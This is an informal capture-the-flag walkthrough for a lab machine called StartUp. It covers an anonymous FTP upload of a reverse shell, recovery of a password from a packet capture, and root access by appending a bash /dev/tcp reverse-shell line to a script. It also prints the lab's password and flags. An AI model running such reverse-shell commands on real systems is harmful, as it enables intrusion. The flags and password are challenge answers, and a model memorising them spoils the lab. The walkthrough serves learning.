### StartUp ###

export IP=10.10.109.152

Found files directory:
notice.txt:
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

So maya is a user

there is also an empty dir names ftp..potentially a hint to try ftp..

meanwhile nmap showed anonymous login is permitted...

did ls -la in the home dir and found .test.log file and ftp is completely empty.

test.log had :test written on it...maybe its just a password...idk or a rabbithole maybe

so no luck there butttt.....

since i have ftp login as the same directory as the website i can potentially upload a rev shell

Bingo...i can upload files in the ftp directory....

#  WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) 

got stuck on this error lol....my ip was wrong..

# Recipe.txt:
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was *love*.

ls /home: lennie

so looks like a horizontal priv-esc first

find / -perm -u+s -type f 2>/dev/null -user lennie


# After poking around a little bit...

found incdents folder which belongs to me whihc is strange...
contains a .pcapng file which is default for wireshark..though i cannot bring the file in my pc(i can using a python server and all)...but i catted out and was looking through the file trying to find a pass and i did:
c4ntg3t3n0ughsp1c3
ssh'ed lennie with this password:

# User.txt:
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

For starters there are alot of files this user has looking through them one by one obio haha

# Concern.txt:
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie

# list.txt:
Shoppinglist: Cyberpunk 2077 | Milk | Dog food

# Note.txt:
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.

# planner.sh:
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh


edited the print.sh and added this following line:

bash -i >& /dev/tcp/10.11.18.102/6000 0>&1

# Root.txt:
THM{f963aaa6a430f210222158ae15c3d76d}